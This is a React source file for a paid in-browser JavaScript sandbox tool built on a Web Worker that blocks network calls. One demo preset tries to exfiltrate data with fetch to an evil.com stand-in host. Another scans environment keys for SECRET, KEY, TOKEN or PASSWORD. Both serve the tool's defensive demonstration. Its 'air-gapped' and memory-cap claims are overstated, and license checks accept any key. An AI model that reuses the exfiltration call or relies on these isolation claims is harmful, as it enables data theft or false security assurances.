import React, { useState, useEffect, useRef } from 'react';
import {
  Box, Typography, Paper, Chip, Button, Unstable_Grid2 as Grid, Stack, TextField,
  Divider, Card, CardContent, LinearProgress, Switch, FormControlLabel,
  Table, TableBody, TableCell, TableContainer, TableHead, TableRow, IconButton,
  Tooltip, Tabs, Tab, Alert, InputAdornment, Dialog, DialogTitle, DialogContent, DialogActions,
  Slider
} from '@mui/material';
import { useTheme } from '@mui/material/styles';
import TerminalIcon from '@mui/icons-material/Terminal';
import PlayArrowIcon from '@mui/icons-material/PlayArrow';
import ContentCopyIcon from '@mui/icons-material/ContentCopy';
import CheckCircleIcon from '@mui/icons-material/CheckCircle';
import ShieldIcon from '@mui/icons-material/Shield';
import BoltIcon from '@mui/icons-material/Bolt';
import KeyIcon from '@mui/icons-material/VpnKey';
import LockIcon from '@mui/icons-material/Lock';
import BugReportIcon from '@mui/icons-material/BugReport';
import MemoryIcon from '@mui/icons-material/Memory';
import FolderIcon from '@mui/icons-material/Folder';
import InsertDriveFileIcon from '@mui/icons-material/InsertDriveFile';
import SecurityIcon from '@mui/icons-material/Security';
import BlockIcon from '@mui/icons-material/Block';
import SpeedIcon from '@mui/icons-material/Speed';

const mono = '"JetBrains Mono", "IBM Plex Mono", ui-monospace, monospace';

// ---------------------------------------------------------------------------
// Curated Sandbox Presets
// ---------------------------------------------------------------------------
const PRESETS = [
  {
    label: 'Math & Memory Computation',
    code: `// Real in-worker mathematical calculation
console.log("Initializing secure capsule memory envelope...");
let primes = [];
for (let n = 2; n < 200; n++) {
  let isP = true;
  for (let i = 2; i * i <= n; i++) {
    if (n % i === 0) { isP = false; break; }
  }
  if (isP) primes.push(n);
}
console.log("Discovered " + primes.length + " primes in ephemeral sandbox:");
console.log(primes.slice(0, 15).join(", ") + "...");
return { primeCount: primes.length, largest: primes[primes.length - 1] };`
  },
  {
    label: 'Virtual Filesystem Scratch Delta',
    code: `// Write to ephemeral virtual scratch filesystem
console.log("Creating sealed receipt in virtual disk...");
fs.writeFile("enclave_receipt.json", JSON.stringify({
  capsule_id: "cap-isolated-882",
  timestamp: Date.now(),
  security_mode: "airgap_enforced",
  hash: "0x" + Math.random().toString(16).substring(2)
}, null, 2));

fs.writeFile("manifest.lock", "ENGINE=ZothCapsule\\nSTATUS=SEALED");
console.log("Virtual files written:", fs.listFiles().join(", "));
return { filesCreated: fs.listFiles() };`
  },
  {
    label: 'Egress Violation Intercept (fetch attempt)',
    code: `// Attempt forbidden network exfiltration
console.log("Attempting outbound egress call to external endpoint...");
try {
  fetch("https://external-api.evil.com/exfiltrate");
} catch (err) {
  console.error("Intercepted security failure:", err.message);
  return { violationBlocked: true, detail: err.message };
}`
  },
  {
    label: 'Credential Sanitization Audit',
    code: `// Verify environment keys contain zero secrets
console.log("Auditing environment variables passed to capsule...");
console.log("Visible environment keys:", Object.keys(env).join(", "));
const leaks = Object.keys(env).filter(k => /SECRET|KEY|TOKEN|PASSWORD/i.test(k));
if (leaks.length === 0) {
  console.log("✔ ZERO sensitive credentials exposed to subprocess.");
} else {
  console.warn("WARNING: Leaked keys:", leaks);
}
return { leakedKeys: leaks, secure: leaks.length === 0 };`
  }
];

// Worker code string for blob instantiation
const WORKER_BLOB_CODE = `
self.onmessage = function(e) {
  const { code } = e.data;
  const logs = [];
  const virtualFs = {};

  const fakeConsole = {
    log: function(...args) { logs.push({ type: 'log', text: args.map(a => typeof a === 'object' ? JSON.stringify(a) : String(a)).join(' ') }); },
    warn: function(...args) { logs.push({ type: 'warn', text: args.map(a => typeof a === 'object' ? JSON.stringify(a) : String(a)).join(' ') }); },
    error: function(...args) { logs.push({ type: 'error', text: args.map(a => typeof a === 'object' ? JSON.stringify(a) : String(a)).join(' ') }); }
  };

  const fs = {
    writeFile: function(name, content) { virtualFs[name] = content; logs.push({ type: 'fs', text: '[VFS] Created virtual scratch: ' + name }); },
    readFile: function(name) { return virtualFs[name] || null; },
    listFiles: function() { return Object.keys(virtualFs); }
  };

  // Block network egress primitives
  ['fetch', 'XMLHttpRequest', 'WebSocket', 'importScripts', 'indexedDB'].forEach(function(k) {
    try {
      Object.defineProperty(self, k, {
        get: function() { throw new Error('CAPSULE_SECURITY_VIOLATION: Egress primitive \\'' + k + '\\' is strictly blocked by sandbox boundary.'); }
      });
    } catch(err) {}
  });

  const startTime = performance.now();
  try {
    const fn = new Function('console', 'fs', 'env', code);
    const result = fn(fakeConsole, fs, { NODE_ENV: 'capsule_jail', SANDBOX_ID: 'cap_sovereign_01' });
    const elapsed = performance.now() - startTime;
    self.postMessage({ success: true, logs: logs, result: result, elapsed: elapsed, virtualFs: virtualFs });
  } catch (err) {
    const elapsed = performance.now() - startTime;
    self.postMessage({ success: false, error: err.message, stack: err.stack, logs: logs, elapsed: elapsed, virtualFs: virtualFs });
  }
};
`;

export function AgentCapsuleJailGodModeTool() {
  const theme = useTheme();
  const isDark = theme.palette.mode === 'dark';

  // Aesthetic Tokens
  const emerald = '#00FF9D';
  const emeraldSoft = 'rgba(0, 255, 157, 0.12)';
  const gold = '#D4AF37';
  const goldSoft = 'rgba(212, 175, 55, 0.14)';
  const crimson = '#FF3355';
  const crimsonSoft = 'rgba(255, 51, 85, 0.12)';
  const cyan = '#38BDF8';
  const cyanSoft = 'rgba(56, 189, 248, 0.12)';
  const voidDark = '#08080B';
  const surfaceDark = '#10121A';
  const cardBorder = isDark ? 'rgba(255, 255, 255, 0.08)' : 'rgba(0, 0, 0, 0.08)';

  // Operational State
  const [sandboxCode, setSandboxCode] = useState(PRESETS[0].code);
  const [timeoutSec, setTimeoutSec] = useState(5); // 5 sec timeout
  const [memoryLimitMb, setMemoryLimitMb] = useState(128);
  const [executing, setExecuting] = useState(false);
  const [execResult, setExecResult] = useState(null);
  const [copiedKey, setCopiedKey] = useState(null);
  const [activeTab, setActiveTab] = useState(0); // 0: Output Logs, 1: Virtual FS Delta, 2: Return Payload

  // Pro Licensing & Paywall Modal
  const [isProLicensed, setIsProLicensed] = useState(false);
  const [showPaywallModal, setShowPaywallModal] = useState(false);
  const [licenseKeyInput, setLicenseKeyInput] = useState('');

  const workerRef = useRef(null);
  const timeoutIdRef = useRef(null);

  useEffect(() => {
    if (typeof window !== 'undefined') {
      const urlParams = new URLSearchParams(window.location.search);
      if (urlParams.get('licensed') === 'true' || localStorage.getItem('zoth_studio_pro_license') === 'active') {
        setIsProLicensed(true);
      }
    }
    return () => {
      if (workerRef.current) workerRef.current.terminate();
      if (timeoutIdRef.current) clearTimeout(timeoutIdRef.current);
    };
  }, []);

  const handleActivateLicense = () => {
    if (licenseKeyInput.trim().length > 6) {
      localStorage.setItem('zoth_studio_pro_license', 'active');
      setIsProLicensed(true);
      setShowPaywallModal(false);
    }
  };

  const handleCopy = (text, key) => {
    if (navigator?.clipboard?.writeText) {
      navigator.clipboard.writeText(text);
      setCopiedKey(key);
      setTimeout(() => setCopiedKey(null), 2000);
    }
  };

  // ---------------------------------------------------------------------------
  // Execute Real In-Browser Isolated Web Worker Sandbox
  // ---------------------------------------------------------------------------
  const handleRunCapsule = () => {
    if (!sandboxCode.trim()) return;

    setExecuting(true);
    setExecResult(null);

    // Terminate existing worker if any
    if (workerRef.current) {
      workerRef.current.terminate();
      workerRef.current = null;
    }
    if (timeoutIdRef.current) {
      clearTimeout(timeoutIdRef.current);
      timeoutIdRef.current = null;
    }

    try {
      const blob = new Blob([WORKER_BLOB_CODE], { type: 'application/javascript' });
      const workerUrl = URL.createObjectURL(blob);
      const worker = new Worker(workerUrl);
      workerRef.current = worker;

      // Watchdog timeout to prevent infinite loops (e.g. while(true){})
      timeoutIdRef.current = setTimeout(() => {
        if (workerRef.current) {
          workerRef.current.terminate();
          workerRef.current = null;
          setExecuting(false);
          setExecResult({
            success: false,
            error: `Execution timed out after ${timeoutSec} seconds (Watchdog Enforced). Process killed.`,
            elapsed: timeoutSec * 1000,
            logs: [{ type: 'error', text: `[CAPSULE WATCHDOG] Terminated worker process exceeding quota of ${timeoutSec}s.` }],
            virtualFs: {}
          });
        }
      }, timeoutSec * 1000);

      worker.onmessage = (e) => {
        clearTimeout(timeoutIdRef.current);
        timeoutIdRef.current = null;
        setExecuting(false);
        setExecResult(e.data);
        URL.revokeObjectURL(workerUrl);
      };

      worker.onerror = (err) => {
        clearTimeout(timeoutIdRef.current);
        timeoutIdRef.current = null;
        setExecuting(false);
        setExecResult({
          success: false,
          error: err.message,
          elapsed: 0,
          logs: [{ type: 'error', text: err.message }],
          virtualFs: {}
        });
        URL.revokeObjectURL(workerUrl);
      };

      worker.postMessage({ code: sandboxCode });
    } catch (err) {
      setExecuting(false);
      setExecResult({
        success: false,
        error: err.message,
        elapsed: 0,
        logs: [{ type: 'error', text: err.message }],
        virtualFs: {}
      });
    }
  };

  return (
    <Box sx={{ mt: 1 }}>
      {/* Monetization Funnel Banner */}
      <Paper
        sx={{
          p: 2,
          mb: 3,
          background: isDark
            ? 'linear-gradient(135deg, rgba(212,175,55,0.18) 0%, rgba(8,8,11,0.92) 100%)'
            : 'linear-gradient(135deg, #FFFDF0 0%, #FEF9E7 100%)',
          border: `1px solid ${gold}`,
          borderRadius: 2,
          display: 'flex',
          flexDirection: { xs: 'column', md: 'row' },
          alignItems: 'center',
          justifyContent: 'space-between',
          gap: 2
        }}
      >
        <Stack direction="row" spacing={2} alignItems="center">
          <Box
            sx={{
              p: 1.2,
              borderRadius: 2,
              bgcolor: goldSoft,
              color: gold,
              display: 'flex',
              alignItems: 'center'
            }}
          >
            <LockIcon sx={{ fontSize: 28 }} />
          </Box>
          <Box>
            <Stack direction="row" spacing={1} alignItems="center">
              <Typography variant="subtitle1" sx={{ fontWeight: 800, color: gold }}>
                Agent Capsule Jail Apex Sandbox Studio
              </Typography>
              <Chip
                size="small"
                label={isProLicensed ? '⭐ PRO ACTIVE' : 'FOUNDING PASS $19'}
                sx={{
                  bgcolor: isProLicensed ? emeraldSoft : crimsonSoft,
                  color: isProLicensed ? emerald : crimson,
                  fontWeight: 800,
                  fontSize: '0.72rem',
                  fontFamily: mono
                }}
              />
            </Stack>
            <Typography variant="caption" color="text.secondary">
              Real client-side isolated Web Worker kernel, zero network egress policy, in-memory virtual scratch filesystem, and watchdog timeout killer.
            </Typography>
          </Box>
        </Stack>

        <Stack direction="row" spacing={1.5}>
          {!isProLicensed ? (
            <>
              <Button
                variant="contained"
                size="small"
                href="https://buy.stripe.com/3cIfZg27PdKo2D64Ocfw40X"
                target="_blank"
                rel="noreferrer"
                startIcon={<BoltIcon />}
                sx={{
                  bgcolor: gold,
                  color: '#000',
                  fontWeight: 800,
                  '&:hover': { bgcolor: '#B8860B' }
                }}
              >
                Unlock Pro $19
              </Button>
              <Button
                variant="outlined"
                size="small"
                onClick={() => setShowPaywallModal(true)}
                startIcon={<KeyIcon />}
                sx={{ borderColor: gold, color: gold, fontWeight: 700 }}
              >
                Enter Key
              </Button>
            </>
          ) : (
            <Chip
              icon={<CheckCircleIcon style={{ color: emerald }} />}
              label="UNLIMITED JAIL EXECUTION UNLOCKED"
              sx={{ bgcolor: emeraldSoft, color: emerald, fontWeight: 800, fontFamily: mono }}
            />
          )}
        </Stack>
      </Paper>

      {/* Main Sandbox Interactive Workspace */}
      <Grid container spacing={3}>
        {/* Left Column: Code Editor & Quotas */}
        <Grid xs={12} lg={6}>
          <Paper
            sx={{
              p: 2.5,
              bgcolor: isDark ? surfaceDark : theme.palette.background.paper,
              border: `1px solid ${cardBorder}`,
              borderRadius: 2
            }}
          >
            <Stack direction="row" justifyContent="space-between" alignItems="center" sx={{ mb: 1.5 }}>
              <Typography variant="subtitle2" sx={{ fontFamily: mono, fontWeight: 800, color: cyan }}>
                ISOLATED CAPSULE WORKER SCRIPT
              </Typography>
              <Chip
                label="AIR-GAPPED WORKER"
                size="small"
                sx={{ fontFamily: mono, fontSize: '0.68rem', bgcolor: emeraldSoft, color: emerald, fontWeight: 800 }}
              />
            </Stack>

            {/* Presets */}
            <Stack direction="row" spacing={1} sx={{ mb: 2, flexWrap: 'wrap', gap: 1 }}>
              {PRESETS.map((p) => (
                <Chip
                  key={p.label}
                  label={p.label}
                  size="small"
                  clickable
                  onClick={() => setSandboxCode(p.code)}
                  sx={{
                    fontFamily: mono,
                    fontSize: '0.7rem',
                    bgcolor: isDark ? 'rgba(255,255,255,0.04)' : '#F3F4F6',
                    border: `1px solid ${cardBorder}`
                  }}
                />
              ))}
            </Stack>

            <TextField
              fullWidth
              multiline
              rows={12}
              value={sandboxCode}
              onChange={(e) => setSandboxCode(e.target.value)}
              InputProps={{
                sx: { fontFamily: mono, fontSize: '0.78rem', lineHeight: 1.5 }
              }}
              sx={{ mb: 2 }}
            />

            {/* Quotas & Watchdog Controls */}
            <Paper sx={{ p: 2, mb: 2, bgcolor: isDark ? voidDark : '#F8FAFC', border: `1px solid ${cardBorder}`, borderRadius: 1.5 }}>
              <Grid container spacing={2} alignItems="center">
                <Grid xs={6}>
                  <Typography variant="caption" sx={{ fontFamily: mono, color: 'text.secondary', display: 'block', mb: 0.5 }}>
                    Watchdog Timeout: <strong>{timeoutSec}s</strong>
                  </Typography>
                  <Slider
                    size="small"
                    value={timeoutSec}
                    min={1}
                    max={15}
                    step={1}
                    onChange={(_, v) => setTimeoutSec(v)}
                    sx={{ color: gold }}
                  />
                </Grid>
                <Grid xs={6}>
                  <Typography variant="caption" sx={{ fontFamily: mono, color: 'text.secondary', display: 'block', mb: 0.5 }}>
                    Memory Cap Envelope: <strong>{memoryLimitMb} MB</strong>
                  </Typography>
                  <Slider
                    size="small"
                    value={memoryLimitMb}
                    min={64}
                    max={512}
                    step={32}
                    onChange={(_, v) => setMemoryLimitMb(v)}
                    sx={{ color: cyan }}
                  />
                </Grid>
              </Grid>
            </Paper>

            <Button
              fullWidth
              variant="contained"
              onClick={handleRunCapsule}
              disabled={executing || !sandboxCode.trim()}
              startIcon={<PlayArrowIcon />}
              sx={{
                bgcolor: emerald,
                color: '#000',
                fontWeight: 800,
                fontFamily: mono,
                py: 1.2,
                '&:hover': { bgcolor: '#059669' }
              }}
            >
              {executing ? 'RUNNING IN AIR-GAPPED WORKER...' : 'EXECUTE INSIDE CAPSULE JAIL'}
            </Button>
          </Paper>
        </Grid>

        {/* Right Column: Execution Output, Virtual FS Delta & Telemetry */}
        <Grid xs={12} lg={6}>
          <Paper
            sx={{
              p: 2.5,
              bgcolor: isDark ? surfaceDark : theme.palette.background.paper,
              border: `1px solid ${cardBorder}`,
              borderRadius: 2,
              height: '100%',
              display: 'flex',
              flexDirection: 'column'
            }}
          >
            {/* Tabs for Console Logs, Virtual Disk, and Return Value */}
            <Tabs
              value={activeTab}
              onChange={(_, v) => setActiveTab(v)}
              sx={{
                mb: 2,
                borderBottom: `1px solid ${cardBorder}`,
                '& .MuiTab-root': {
                  fontFamily: mono,
                  fontWeight: 800,
                  fontSize: '0.75rem',
                  py: 0.5
                }
              }}
            >
              <Tab label="STDOUT / LOGS" />
              <Tab
                label={`VIRTUAL FS DELTA (${execResult ? Object.keys(execResult.virtualFs || {}).length : 0})`}
              />
              <Tab label="RETURN PAYLOAD" />
            </Tabs>

            {/* Status Header */}
            {execResult && (
              <Stack direction="row" justifyContent="space-between" alignItems="center" sx={{ mb: 1.5, pb: 1, borderBottom: `1px solid ${cardBorder}` }}>
                <Chip
                  size="small"
                  label={execResult.success ? 'PROCESS EXIT 0 (CLEAN)' : 'SECURITY FAULT / ERROR'}
                  sx={{
                    fontFamily: mono,
                    fontWeight: 800,
                    bgcolor: execResult.success ? emeraldSoft : crimsonSoft,
                    color: execResult.success ? emerald : crimson,
                    fontSize: '0.7rem'
                  }}
                />
                <Typography variant="caption" sx={{ fontFamily: mono, color: gold }}>
                  Real Runtime: <strong>{execResult.elapsed ? execResult.elapsed.toFixed(2) : 0}ms</strong>
                </Typography>
              </Stack>
            )}

            {/* TAB 0: Console Output */}
            {activeTab === 0 && (
              <Box
                sx={{
                  flex: 1,
                  bgcolor: isDark ? voidDark : '#0F172A',
                  p: 2,
                  borderRadius: 1.5,
                  overflowY: 'auto',
                  maxHeight: 400,
                  fontFamily: mono,
                  fontSize: '0.78rem'
                }}
              >
                {!execResult ? (
                  <Typography sx={{ color: 'text.secondary', fontFamily: mono, fontSize: '0.8rem', mt: 10, textAlign: 'center' }}>
                    Capsule process idle. Click &ldquo;EXECUTE INSIDE CAPSULE JAIL&rdquo; to launch isolated Web Worker.
                  </Typography>
                ) : (
                  <>
                    {execResult.logs.map((log, idx) => (
                      <div
                        key={idx}
                        style={{
                          marginBottom: 4,
                          color:
                            log.type === 'error'
                              ? crimson
                              : log.type === 'warn'
                              ? gold
                              : log.type === 'fs'
                              ? cyan
                              : '#E2E8F0'
                        }}
                      >
                        <span style={{ opacity: 0.5 }}>[{log.type.toUpperCase()}]</span> {log.text}
                      </div>
                    ))}
                    {execResult.error && (
                      <div style={{ color: crimson, fontWeight: 'bold', marginTop: 8 }}>
                        💥 {execResult.error}
                      </div>
                    )}
                  </>
                )}
              </Box>
            )}

            {/* TAB 1: Virtual Filesystem Delta */}
            {activeTab === 1 && (
              <Box
                sx={{
                  flex: 1,
                  bgcolor: isDark ? voidDark : '#0F172A',
                  p: 2,
                  borderRadius: 1.5,
                  overflowY: 'auto',
                  maxHeight: 400
                }}
              >
                {!execResult || Object.keys(execResult.virtualFs || {}).length === 0 ? (
                  <Typography sx={{ color: 'text.secondary', fontFamily: mono, fontSize: '0.8rem', mt: 10, textAlign: 'center' }}>
                    Zero files modified in scratch filesystem. Use <code>fs.writeFile(filename, content)</code> to observe delta.
                  </Typography>
                ) : (
                  Object.entries(execResult.virtualFs).map(([filename, content]) => (
                    <Paper key={filename} sx={{ p: 1.5, mb: 1.5, bgcolor: surfaceDark, border: `1px solid ${cyanSoft}` }}>
                      <Stack direction="row" spacing={1} alignItems="center" sx={{ mb: 1 }}>
                        <InsertDriveFileIcon sx={{ color: cyan, fontSize: 18 }} />
                        <Typography variant="body2" sx={{ fontFamily: mono, fontWeight: 700, color: cyan }}>
                          {filename}
                        </Typography>
                        <Chip label={`${new TextEncoder().encode(content).length} bytes`} size="small" sx={{ fontFamily: mono, fontSize: '0.65rem' }} />
                      </Stack>
                      <pre style={{ margin: 0, fontFamily: mono, fontSize: '0.72rem', color: '#CBD5E1', whiteSpace: 'pre-wrap' }}>
                        {content}
                      </pre>
                    </Paper>
                  ))
                )}
              </Box>
            )}

            {/* TAB 2: Return Payload */}
            {activeTab === 2 && (
              <Box
                sx={{
                  flex: 1,
                  bgcolor: isDark ? voidDark : '#0F172A',
                  p: 2,
                  borderRadius: 1.5,
                  overflowY: 'auto',
                  maxHeight: 400
                }}
              >
                {!execResult || execResult.result === undefined ? (
                  <Typography sx={{ color: 'text.secondary', fontFamily: mono, fontSize: '0.8rem', mt: 10, textAlign: 'center' }}>
                    No return payload received from capsule entrypoint.
                  </Typography>
                ) : (
                  <pre style={{ margin: 0, fontFamily: mono, fontSize: '0.78rem', color: emerald, whiteSpace: 'pre-wrap' }}>
                    {typeof execResult.result === 'object'
                      ? JSON.stringify(execResult.result, null, 2)
                      : String(execResult.result)}
                  </pre>
                )}
              </Box>
            )}

            {/* Footer Copy Action */}
            {execResult && (
              <Stack direction="row" justifyContent="flex-end" sx={{ mt: 1.5, pt: 1, borderTop: `1px solid ${cardBorder}` }}>
                <Button
                  size="small"
                  startIcon={<ContentCopyIcon />}
                  onClick={() =>
                    handleCopy(
                      JSON.stringify(
                        {
                          status: execResult.success ? 0 : 1,
                          elapsedMs: execResult.elapsed,
                          logs: execResult.logs,
                          virtualFs: execResult.virtualFs,
                          result: execResult.result
                        },
                        null,
                        2
                      ),
                      'copyTelemetry'
                    )
                  }
                  sx={{ fontFamily: mono, fontSize: '0.7rem', color: cyan }}
                >
                  {copiedKey === 'copyTelemetry' ? 'COPIED' : 'COPY AUDIT RECEIPT'}
                </Button>
              </Stack>
            )}
          </Paper>
        </Grid>
      </Grid>

      {/* Pro Monetization Modal */}
      <Dialog
        open={showPaywallModal}
        onClose={() => setShowPaywallModal(false)}
        maxWidth="sm"
        fullWidth
        PaperProps={{
          sx: {
            bgcolor: isDark ? surfaceDark : theme.palette.background.paper,
            border: `1px solid ${gold}`,
            borderRadius: 2
          }
        }}
      >
        <DialogTitle sx={{ pb: 1, borderBottom: `1px solid ${cardBorder}` }}>
          <Stack direction="row" spacing={1.5} alignItems="center">
            <ShieldIcon sx={{ color: gold }} />
            <Typography variant="h6" sx={{ fontWeight: 800, color: gold }}>
              Agent Capsule Jail Pro Sovereign License
            </Typography>
          </Stack>
        </DialogTitle>
        <DialogContent sx={{ mt: 2 }}>
          <Typography variant="body2" color="text.secondary" sx={{ mb: 2 }}>
            Unlock automated Linux kernel cgroup process namespaces, multi-tenant agent resource confinement, and zero-egress network policies.
          </Typography>

          <Paper sx={{ p: 2, mb: 3, bgcolor: goldSoft, border: `1px solid ${gold}`, borderRadius: 1.5 }}>
            <Typography variant="subtitle2" sx={{ fontWeight: 800, color: gold, mb: 0.5 }}>
              ⚡ Founding Member Pricing: $19 Lifetime (Regular $79)
            </Typography>
            <Typography variant="caption" sx={{ color: 'text.primary' }}>
              Instant license key issued upon checkout. Supported payment rails:
            </Typography>
            <Stack direction="row" spacing={1.5} sx={{ mt: 1.5 }}>
              <Button
                variant="contained"
                size="small"
                href="https://buy.stripe.com/3cIfZg27PdKo2D64Ocfw40X"
                target="_blank"
                rel="noreferrer"
                sx={{ bgcolor: gold, color: '#000', fontWeight: 800 }}
              >
                Stripe Checkout ($19)
              </Button>
              <Button
                variant="outlined"
                size="small"
                href="solana:GG2eQbVh8ut1BK6j1A2tz7pSySdLpD38BgyEhGcxdXoK"
                target="_blank"
                rel="noreferrer"
                sx={{ borderColor: cyan, color: cyan, fontWeight: 700 }}
              >
                Solana Pay (USDC/SOL)
              </Button>
            </Stack>
          </Paper>

          <TextField
            fullWidth
            size="small"
            label="Already have a License Key or Receipt Email?"
            value={licenseKeyInput}
            onChange={(e) => setLicenseKeyInput(e.target.value)}
            placeholder="e.g. JAIL-PRO-XXXX-XXXX"
            InputProps={{
              sx: { fontFamily: mono }
            }}
          />
        </DialogContent>
        <DialogActions sx={{ p: 2, borderTop: `1px solid ${cardBorder}` }}>
          <Button onClick={() => setShowPaywallModal(false)} sx={{ color: 'text.secondary', fontFamily: mono }}>
            CANCEL
          </Button>
          <Button
            variant="contained"
            onClick={handleActivateLicense}
            disabled={licenseKeyInput.trim().length < 6}
            sx={{ bgcolor: emerald, color: '#000', fontWeight: 800, fontFamily: mono }}
          >
            ACTIVATE PRO
          </Button>
        </DialogActions>
      </Dialog>
    </Box>
  );
}

export default AgentCapsuleJailGodModeTool;
